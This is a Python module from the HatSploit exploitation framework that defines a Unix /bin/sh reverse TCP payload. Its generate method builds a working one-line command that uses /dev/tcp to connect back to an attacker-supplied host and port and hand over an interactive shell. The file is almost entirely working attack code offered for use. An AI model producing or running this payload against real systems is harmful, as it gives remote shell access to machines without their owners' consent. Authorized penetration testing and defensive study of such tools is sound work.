#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import HatSploitPayload

class HatSploitPayload(HatSploitPayload):
    details = {
        'Name': "Unix /bin/sh Reverse TCP",
        'Payload': "unix/generic/sh_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Unix /bin/sh Reverse TCP payload."
    }
    
    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }
    
    def generate(self):
        local_host, local_port = self.parser.parse_options(self.options)

        self.badges.output_process("Generating payload...")
        payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"

        self.method['Payload'] = payload
        self.method['Insructions'] = payload
        self.method['Action'] = 'reverse_tcp'

        return payload
